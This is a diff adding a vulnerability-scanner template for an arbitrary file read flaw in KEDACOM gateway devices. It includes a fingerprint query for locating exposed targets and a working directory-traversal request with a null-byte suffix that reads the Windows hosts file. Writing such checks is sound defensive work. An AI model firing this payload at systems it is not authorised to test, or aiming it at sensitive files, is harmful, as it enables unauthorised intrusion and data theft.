@@ -1,0 +1,19 @@
+id: kedacom-gateway-file-read
+
+info:
+  name: KEDACOM数字系统接入网关 任意文件读取漏洞
+  author: zan8in
+  severity: high
+  description: |
+    KEDACOM 数字系统接入网关 存在任意文件读取漏洞，攻击者通过构造请求可以读取服务器任意文件
+    (app="KEDACOM-DVR接入网关") && (is_honeypot=false && is_fraud=false)
+  reference:
+    - http://wiki.peiqi.tech/wiki/iot/KEDACOM/KEDACOM%E6%95%B0%E5%AD%97%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /gatewayweb/FileDownloadServlet?fileName=test.txt&filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg&type=2
+    expression: response.status == 200 && response.body.bcontains(b'Microsoft TCP/IP for Windows') && response.body.bcontains(b'HOSTS file')
+expression: r0()
